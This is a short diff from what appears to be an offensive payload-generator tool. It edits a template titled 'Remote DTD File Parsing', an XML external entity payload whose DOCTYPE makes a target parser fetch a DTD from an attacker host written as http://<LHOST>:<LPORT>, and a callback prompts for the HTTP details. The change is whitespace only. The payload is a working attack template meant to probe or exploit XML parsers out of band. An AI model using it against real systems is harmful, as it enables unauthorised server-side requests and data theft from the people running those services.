@@ -52,7 +52,7 @@ Optional: callback (used for prompt variable)
 
 Load({
 	title: "Remote DTD File Parsing",
-	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<LHOST>:<LPORT>'>",
+	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<LHOST>:<LPORT>' >",
 	callback: function(bro){
 		question(ask.http);
 		ask.some(questions, bro);
